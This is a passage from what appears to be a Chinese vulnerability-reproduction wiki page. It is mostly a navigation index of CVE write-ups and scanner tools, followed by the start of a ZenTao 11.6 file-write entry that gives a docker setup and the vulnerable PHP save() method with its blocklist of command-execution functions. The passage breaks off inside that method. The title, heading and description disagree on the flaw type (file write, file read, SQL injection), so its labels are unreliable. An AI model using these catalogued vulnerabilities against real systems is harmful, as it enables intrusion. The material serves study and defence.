+        <li class="chapter " data-level="1.3.4.1.1.1" data-path="../../Web服务器漏洞/Apache/Apache Cocoon/Apache Cocoon XML注入 CVE-2020-11991.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Cocoon/Apache Cocoon XML注入 CVE-2020-11991.html">
+            
+                    
+                    Apache Cocoon XML注入 CVE-2020-11991
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.2" data-path="../../Web服务器漏洞/Apache/Apache Flink/">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Flink/">
+            
+                    
+                    Apache Flink
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.1.2.1" data-path="../../Web服务器漏洞/Apache/Apache Flink/Apache Flink 小于1.9.1远程代码执行 CVE-2020-17518.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Flink/Apache Flink 小于1.9.1远程代码执行 CVE-2020-17518.html">
+            
+                    
+                    Apache Flink 小于1.9.1远程代码执行 CVE-2020-17518
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.2.2" data-path="../../Web服务器漏洞/Apache/Apache Flink/Apache Flink 目录遍历漏洞 CVE-2020-17519.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Flink/Apache Flink 目录遍历漏洞 CVE-2020-17519.html">
+            
+                    
+                    Apache Flink 目录遍历漏洞 CVE-2020-17519
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.3" data-path="../../Web服务器漏洞/Apache/Apache HTTPd/">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache HTTPd/">
+            
+                    
+                    Apache HTT Pd
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.1.3.1" data-path="../../Web服务器漏洞/Apache/Apache HTTPd/Apache HTTPd 换行解析漏洞 CVE-2017-15715.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache HTTPd/Apache HTTPd 换行解析漏洞 CVE-2017-15715.html">
+            
+                    
+                    Apache HTTPd 换行解析漏洞 CVE-2017-15715
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.4" data-path="../../Web服务器漏洞/Apache/Apache Kylin/">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Kylin/">
+            
+                    
+                    Apache Kylin
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.1.4.1" data-path="../../Web服务器漏洞/Apache/Apache Kylin/Apache Kylin 命令注入漏洞 CVE-2020-13925.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Kylin/Apache Kylin 命令注入漏洞 CVE-2020-13925.html">
+            
+                    
+                    Apache Kylin 命令注入漏洞 CVE-2020-13925
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.4.2" data-path="../../Web服务器漏洞/Apache/Apache Kylin/Apache Kylin 命令注入漏洞 CVE-2020-1956.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Kylin/Apache Kylin 命令注入漏洞 CVE-2020-1956.html">
+            
+                    
+                    Apache Kylin 命令注入漏洞 CVE-2020-1956
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.4.3" data-path="../../Web服务器漏洞/Apache/Apache Kylin/Apache Kylin的未授权配置泄露.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Kylin/Apache Kylin的未授权配置泄露.html">
+            
+                    
+                    Apache Kylin的未授权配置泄露
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.5" data-path="../../Web服务器漏洞/Apache/Apache Mod_jk/">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Mod_jk/">
+            
+                    
+                    Apache Mod Jk
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.1.5.1" data-path="../../Web服务器漏洞/Apache/Apache Mod_jk/Apache Mod_jk 访问控制权限绕过 CVE-2018-11759.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Mod_jk/Apache Mod_jk 访问控制权限绕过 CVE-2018-11759.html">
+            
+                    
+                    Apache Mod_jk 访问控制权限绕过 CVE-2018-11759
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.6" data-path="../../Web服务器漏洞/Apache/Apache Shiro/">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Shiro/">
+            
+                    
+                    Apache Shiro
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.1.6.1" data-path="../../Web服务器漏洞/Apache/Apache Shiro/Apache Shiro 小于1.2.4反序列化漏洞 CVE-2016-4437.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Shiro/Apache Shiro 小于1.2.4反序列化漏洞 CVE-2016-4437.html">
+            
+                    
+                    Apache Shiro 小于1.2.4反序列化漏洞 CVE-2016-4437
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.7" data-path="../../Web服务器漏洞/Apache/Apache Solr/">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Solr/">
+            
+                    
+                    Apache Solr
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.1.7.1" data-path="../../Web服务器漏洞/Apache/Apache Solr/Apache Solr JMX服务 RCE CVE-2019-12409.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Solr/Apache Solr JMX服务 RCE CVE-2019-12409.html">
+            
+                    
+                    Apache Solr JMX服务 RCE CVE-2019-12409
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.7.2" data-path="../../Web服务器漏洞/Apache/Apache Solr/Apache Solr RCE 未授权上传漏洞 CVE-2020-13957.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Solr/Apache Solr RCE 未授权上传漏洞 CVE-2020-13957.html">
+            
+                    
+                    Apache Solr RCE 未授权上传漏洞 CVE-2020-13957
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.7.3" data-path="../../Web服务器漏洞/Apache/Apache Solr/Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Solr/Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629.html">
+            
+                    
+                    Apache Solr RCE 远程命令执行漏洞 CVE-2017-12629
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.7.4" data-path="../../Web服务器漏洞/Apache/Apache Solr/Apache Solr Velocity模板远程执行 CVE-2019-17558.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Solr/Apache Solr Velocity模板远程执行 CVE-2019-17558.html">
+            
+                    
+                    Apache Solr Velocity模板远程执行 CVE-2019-17558
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.7.5" data-path="../../Web服务器漏洞/Apache/Apache Solr/Apache Solr XXE 漏洞 CVE-2017-12629.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Solr/Apache Solr XXE 漏洞 CVE-2017-12629.html">
+            
+                    
+                    Apache Solr XXE 漏洞 CVE-2017-12629
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.7.6" data-path="../../Web服务器漏洞/Apache/Apache Solr/Apache Solr 远程执行漏洞 CVE-2019-0193.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Solr/Apache Solr 远程执行漏洞 CVE-2019-0193.html">
+            
+                    
+                    Apache Solr 远程执行漏洞 CVE-2019-0193
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.8" data-path="../../Web服务器漏洞/Apache/Apache Struts2/">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Struts2/">
+            
+                    
+                    Apache Struts 2
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.1.8.1" data-path="../../Web服务器漏洞/Apache/Apache Struts2/Scan/">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Struts2/Scan/">
+            
+                    
+                    Scan
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.1.8.1.1" data-path="../../Web服务器漏洞/Apache/Apache Struts2/Scan/扫描工具 Exphub-Strtus2.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Struts2/Scan/扫描工具 Exphub-Strtus2.html">
+            
+                    
+                    扫描工具 Exphub-Strtus2
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.8.1.2" data-path="../../Web服务器漏洞/Apache/Apache Struts2/Scan/扫描工具 Struts2-Scan.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Struts2/Scan/扫描工具 Struts2-Scan.html">
+            
+                    
+                    扫描工具 Struts2-Scan
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.9" data-path="../../Web服务器漏洞/Apache/Apache Tomcat/">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Tomcat/">
+            
+                    
+                    Apache Tomcat
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.1.9.1" data-path="../../Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938.html">
+            
+                    
+                    Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.9.2" data-path="../../Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat WebSocket 拒绝服务漏洞 CVE-2020-13935.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat WebSocket 拒绝服务漏洞 CVE-2020-13935.html">
+            
+                    
+                    Apache Tomcat WebSocket 拒绝服务漏洞 CVE-2020-13935
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.1.9.3" data-path="../../Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat 远程代码执行漏洞 CVE-2017-12615.html">
+            
+                <a href="../../Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat 远程代码执行漏洞 CVE-2017-12615.html">
+            
+                    
+                    Apache Tomcat 远程代码执行漏洞 CVE-2017-12615
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.2" data-path="../../Web服务器漏洞/Jboss/">
+            
+                <a href="../../Web服务器漏洞/Jboss/">
+            
+                    
+                    Jboss
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.2.1" data-path="../../Web服务器漏洞/Jboss/Scan/">
+            
+                <a href="../../Web服务器漏洞/Jboss/Scan/">
+            
+                    
+                    Scan
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.2.1.1" data-path="../../Web服务器漏洞/Jboss/Scan/扫描工具 Jexboss.html">
+            
+                <a href="../../Web服务器漏洞/Jboss/Scan/扫描工具 Jexboss.html">
+            
+                    
+                    扫描工具 Jexboss
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.2.2" data-path="../../Web服务器漏洞/Jboss/JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504.html">
+            
+                <a href="../../Web服务器漏洞/Jboss/JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504.html">
+            
+                    
+                    JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.3" data-path="../../Web服务器漏洞/Nginx/">
+            
+                <a href="../../Web服务器漏洞/Nginx/">
+            
+                    
+                    Nginx
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.3.1" data-path="../../Web服务器漏洞/Nginx/Nginx越界读取缓存漏洞 CVE-2017-7529.html">
+            
+                <a href="../../Web服务器漏洞/Nginx/Nginx越界读取缓存漏洞 CVE-2017-7529.html">
+            
+                    
+                    Nginx越界读取缓存漏洞 CVE-2017-7529
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.4" data-path="../../Web服务器漏洞/Weblogic/">
+            
+                <a href="../../Web服务器漏洞/Weblogic/">
+            
+                    
+                    Weblogic
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.4.1" data-path="../../Web服务器漏洞/Weblogic/Scan/">
+            
+                <a href="../../Web服务器漏洞/Weblogic/Scan/">
+            
+                    
+                    Scan
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.4.4.1.1" data-path="../../Web服务器漏洞/Weblogic/Scan/扫描工具 WeblogicScanner.html">
+            
+                <a href="../../Web服务器漏洞/Weblogic/Scan/扫描工具 WeblogicScanner.html">
+            
+                    
+                    扫描工具 WeblogicScanner
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4.4.2" data-path="../../Web服务器漏洞/Weblogic/Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271.html">
+            
+                <a href="../../Web服务器漏洞/Weblogic/Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271.html">
+            
+                    
+                    Weblogic XMLDecoder 远程代码执行漏洞 CVE-2017-10271
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../../中间件框架漏洞/">
+            
+                <a href="../../中间件框架漏洞/">
+            
+                    
+                    中间件框架漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.6" data-path="../../安全产品漏洞/">
+            
+                <a href="../../安全产品漏洞/">
+            
+                    
+                    安全产品漏洞
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.6.1" data-path="../../安全产品漏洞/天融信/">
+            
+                <a href="../../安全产品漏洞/天融信/">
+            
+                    
+                    天融信
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.6.1.1" data-path="../../安全产品漏洞/天融信/天融信负载均衡TopApp-LB Sql注入漏洞.html">
+            
+                <a href="../../安全产品漏洞/天融信/天融信负载均衡TopApp-LB Sql注入漏洞.html">
+            
+                    
+                    天融信负载均衡TopApp-LB Sql注入漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.6.1.2" data-path="../../安全产品漏洞/天融信/天融信负载均衡TopApp-LB任意登陆.html">
+            
+                <a href="../../安全产品漏洞/天融信/天融信负载均衡TopApp-LB任意登陆.html">
+            
+                    
+                    天融信负载均衡TopApp-LB任意登陆
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.6.1.3" data-path="../../安全产品漏洞/天融信/天融信负载均衡TopApp-LB命令执行漏洞.html">
+            
+                <a href="../../安全产品漏洞/天融信/天融信负载均衡TopApp-LB命令执行漏洞.html">
+            
+                    
+                    天融信负载均衡TopApp-LB命令执行漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.6.2" data-path="../../安全产品漏洞/深信服/">
+            
+                <a href="../../安全产品漏洞/深信服/">
+            
+                    
+                    深信服
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.6.2.1" data-path="../../安全产品漏洞/深信服/深信服EDR远程命令执行 CNVD-2020-46552.html">
+            
+                <a href="../../安全产品漏洞/深信服/深信服EDR远程命令执行 CNVD-2020-46552.html">
+            
+                    
+                    深信服EDR远程命令执行 CNVD-2020-46552
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.6.2.2" data-path="../../安全产品漏洞/深信服/深信服后台任意用户登陆漏洞.html">
+            
+                <a href="../../安全产品漏洞/深信服/深信服后台任意用户登陆漏洞.html">
+            
+                    
+                    深信服后台任意用户登陆漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.6.3" data-path="../../安全产品漏洞/锐捷/">
+            
+                <a href="../../安全产品漏洞/锐捷/">
+            
+                    
+                    锐捷
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.6.3.1" data-path="../../安全产品漏洞/锐捷/锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露.html">
+            
+                <a href="../../安全产品漏洞/锐捷/锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露.html">
+            
+                    
+                    锐捷RG-UAC统一上网行为管理审计系统存在账号密码信息泄露
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.7" data-path="../../操作系统漏洞/">
+            
+                <a href="../../操作系统漏洞/">
+            
+                    
+                    操作系统漏洞
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.7.1" data-path="../../操作系统漏洞/Windows/">
+            
+                <a href="../../操作系统漏洞/Windows/">
+            
+                    
+                    Windows
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.7.1.1" data-path="../../操作系统漏洞/Windows/Scan/">
+            
+                <a href="../../操作系统漏洞/Windows/Scan/">
+            
+                    
+                    Scan
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.7.1.1.1" data-path="../../操作系统漏洞/Windows/Scan/扫描工具 CVE-2020-0796.html">
+            
+                <a href="../../操作系统漏洞/Windows/Scan/扫描工具 CVE-2020-0796.html">
+            
+                    
+                    扫描工具 CVE-2020-0796
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.7.1.2" data-path="../../操作系统漏洞/Windows/Windows CryptoAPI欺骗漏洞 CVE-2020-0601.html">
+            
+                <a href="../../操作系统漏洞/Windows/Windows CryptoAPI欺骗漏洞 CVE-2020-0601.html">
+            
+                    
+                    Windows CryptoAPI欺骗漏洞 CVE-2020-0601
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.7.1.3" data-path="../../操作系统漏洞/Windows/Windows SMB远程代码执行漏洞 CVE-2020-0796.html">
+            
+                <a href="../../操作系统漏洞/Windows/Windows SMB远程代码执行漏洞 CVE-2020-0796.html">
+            
+                    
+                    Windows SMB远程代码执行漏洞 CVE-2020-0796
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.8" data-path="../../服务器应用漏洞/">
+            
+                <a href="../../服务器应用漏洞/">
+            
+                    
+                    服务器应用漏洞
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.8.1" data-path="../../服务器应用漏洞/OpenSSL/">
+            
+                <a href="../../服务器应用漏洞/OpenSSL/">
+            
+                    
+                    Open SSL
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.8.1.1" data-path="../../服务器应用漏洞/OpenSSL/OpenSSL 心脏滴血漏洞 CVE-2014-0160.html">
+            
+                <a href="../../服务器应用漏洞/OpenSSL/OpenSSL 心脏滴血漏洞 CVE-2014-0160.html">
+            
+                    
+                    OpenSSL 心脏滴血漏洞 CVE-2014-0160
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.8.2" data-path="../../服务器应用漏洞/Qemu/">
+            
+                <a href="../../服务器应用漏洞/Qemu/">
+            
+                    
+                    Qemu
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.8.2.1" data-path="../../服务器应用漏洞/Qemu/QEMU 虚拟机逃逸漏洞 CVE-2020-14364.html">
+            
+                <a href="../../服务器应用漏洞/Qemu/QEMU 虚拟机逃逸漏洞 CVE-2020-14364.html">
+            
+                    
+                    QEMU 虚拟机逃逸漏洞 CVE-2020-14364
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.8.3" data-path="../../服务器应用漏洞/Redis/">
+            
+                <a href="../../服务器应用漏洞/Redis/">
+            
+                    
+                    Redis
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.8.3.1" data-path="../../服务器应用漏洞/Redis/Redis 小于5.0.5 主从复制 RCE .html">
+            
+                <a href="../../服务器应用漏洞/Redis/Redis 小于5.0.5 主从复制 RCE .html">
+            
+                    
+                    Redis 小于5.0.5 主从复制 RCE 
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.9" data-path="../../语言框架漏洞/">
+            
+                <a href="../../语言框架漏洞/">
+            
+                    
+                    语言框架漏洞
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.10" data-path="../../路由器漏洞/">
+            
+                <a href="../../路由器漏洞/">
+            
+                    
+                    路由器漏洞
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.10.1" data-path="../../路由器漏洞/Cisco/">
+            
+                <a href="../../路由器漏洞/Cisco/">
+            
+                    
+                    Cisco
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.10.1.1" data-path="../../路由器漏洞/Cisco/CISCO ASA设备任意文件读取漏洞 CVE-2020-3452.html">
+            
+                <a href="../../路由器漏洞/Cisco/CISCO ASA设备任意文件读取漏洞 CVE-2020-3452.html">
+            
+                    
+                    CISCO ASA设备任意文件读取漏洞 CVE-2020-3452
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.10.2" data-path="../../路由器漏洞/TP-Link/">
+            
+                <a href="../../路由器漏洞/TP-Link/">
+            
+                    
+                    TP Link
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.10.2.1" data-path="../../路由器漏洞/TP-Link/TP-Link SR20 远程命令执行.html">
+            
+                <a href="../../路由器漏洞/TP-Link/TP-Link SR20 远程命令执行.html">
+            
+                    
+                    TP-Link SR20 远程命令执行
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.10.3" data-path="../../路由器漏洞/Zyxel/">
+            
+                <a href="../../路由器漏洞/Zyxel/">
+            
+                    
+                    Zyxel
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.10.3.1" data-path="../../路由器漏洞/Zyxel/Zyxel 硬编码后门账户漏洞 CVE-2020-29583.html">
+            
+                <a href="../../路由器漏洞/Zyxel/Zyxel 硬编码后门账户漏洞 CVE-2020-29583.html">
+            
+                    
+                    Zyxel 硬编码后门账户漏洞 CVE-2020-29583
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            本书使用 GitBook 发布
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../../.." >禅道 11.6版本 任意文件写入漏洞</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="&#x7985;&#x9053;-116&#x7248;&#x672C;-&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x6F0F;&#x6D1E;">&#x7985;&#x9053; 11.6&#x7248;&#x672C; &#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x8BFB;&#x53D6;&#x6F0F;&#x6D1E;</h1>
+<h2 id="&#x6F0F;&#x6D1E;&#x63CF;&#x8FF0;">&#x6F0F;&#x6D1E;&#x63CF;&#x8FF0;</h2>
+<p>&#x7985;&#x9053; 11.6 &#x7248;&#x672C;&#x4E2D;&#x5BF9;&#x7528;&#x6237;&#x63A5;&#x53E3;&#x8C03;&#x7528;&#x6743;&#x9650;&#x8FC7;&#x6EE4;&#x4E0D;&#x5B8C;&#x5584;&#xFF0C;&#x5BFC;&#x81F4;&#x8C03;&#x7528;&#x63A5;&#x53E3;&#x6267;&#x884C;SQL&#x8BED;&#x53E5;&#x5BFC;&#x81F4;SQL&#x6CE8;&#x5165;</p>
+<h2 id="&#x5F71;&#x54CD;&#x7248;&#x672C;">&#x5F71;&#x54CD;&#x7248;&#x672C;</h2>
+<blockquote>
+<p>[!NOTE]</p>
+<p>&#x7985;&#x9053; 11.6</p>
+</blockquote>
+<h2 id="&#x73AF;&#x5883;&#x642D;&#x5EFA;">&#x73AF;&#x5883;&#x642D;&#x5EFA;</h2>
+<p>&#x8FD9;&#x91CC;&#x4F7F;&#x7528;docker&#x73AF;&#x5883;&#x642D;&#x5EFA;</p>
+<pre><code>docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6
+</code></pre><p>&#x8BBF;&#x95EE; <strong><a href="http://xxx.xxx.xxx.xxx:8084" target="_blank">http://xxx.xxx.xxx.xxx:8084</a></strong> &#x6309;&#x6B65;&#x9AA4;&#x5B89;&#x88C5;&#x5373;&#x53EF;</p>
+<p><a href="image/zentao-1.png" data-lightbox="97159d33-bcc3-4fff-a5fe-44843c01780a" data-title=""><img src="image/zentao-1.png" alt=""></a></p>
+<h2 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;">&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h2>
+<p>&#x8FD9;&#x91CC;&#x9020;&#x6210;&#x6F0F;&#x6D1E;&#x7684;&#x539F;&#x56E0;&#x540C;&#x6837;&#x662F;&#x8C03;&#x7528;&#x63A5;&#x53E3;&#x6743;&#x9650;&#x65E0;&#x9650;&#x5236;&#x7684;&#x539F;&#x56E0;</p>
+<p>&#x63A5;&#x53E3;&#x51FA;&#x73B0;&#x6F0F;&#x6D1E;&#x7684;&#x539F;&#x56E0;&#x5177;&#x4F53;&#x53C2;&#x8003;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x4E0A;&#x4E00;&#x7BC7; <strong>&#x7985;&#x9053; 11.6&#x7248;&#x672C; SQL&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;</strong> &#x5173;&#x4E8E;&#x6B64;&#x6F0F;&#x6D1E;&#x7684;&#x5B8C;&#x6574;&#x5206;&#x6790;</p>
+<p>&#x67E5;&#x770B;<strong>module/api/ediyor/moudel.php</strong>&#x4E0B;&#x7684;<strong>save&#x65B9;&#x6CD5;</strong></p>
+<pre><code class="lang-php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span><span class="hljs-params">($filePath)</span>
+    </span>{
+        $fileContent = $this-&gt;post-&gt;fileContent;
+        $evils       = <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;eval&apos;</span>, <span class="hljs-string">&apos;exec&apos;</span>, <span class="hljs-string">&apos;passthru&apos;</span>, <span class="hljs-string">&apos;proc_open&apos;</span>, <span class="hljs-string">&apos;shell_exec&apos;</span>, <span class="hljs-string">&apos;system&apos;</span>, <span class="hljs-string">&apos;$$&apos;</span>, <span class="hljs-string">&apos;include&apos;</span>, <span class="hljs-string">&apos;require&apos;</span>, <span class="hljs-string">&apos;assert&apos;</span>);
